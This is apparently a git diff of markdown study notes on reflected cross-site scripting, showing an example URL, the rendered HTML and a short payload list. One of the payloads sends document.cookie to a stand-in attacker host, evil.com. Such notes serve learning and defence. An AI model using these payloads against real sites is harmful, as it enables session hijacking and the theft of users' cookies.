@@ -1,4 +1,4 @@
-# 🚨 Reflected XSS (Cross-Site Scripting) 
+# 🚨 Reflected XSS (Cross-Site Scripting) — Complete Notes
 
 ## 🧠 What is Reflected XSS?
 
@@ -14,16 +14,15 @@ Reflected XSS is a type of vulnerability where **malicious JavaScript is reflect
 
 **URL:**
 
+
 https://example.com/search?q=<script>alert('XSS')</script>
 
-php-template
-Copy
-Edit
 
 **Rendered HTML:**
 
 ```html
 <p>Search results for <script>alert('XSS')</script></p>
+
 💥 Result: JavaScript is executed on page load.
 
 🎯 How Attackers Exploit Reflected XSS
@@ -35,13 +34,11 @@ Form inputs
 HTTP headers like Referer, User-Agent
 
 Payload Examples
-html
-Copy
-Edit
 <script>alert('XSS')</script>
 <img src=x onerror="alert('XSS')">
 "><svg/onload=alert(1)>
 <script>fetch('http://evil.com?cookie=' + document.cookie)</script>
+
 Attacker Goals
 🥷 Steal session cookies
 
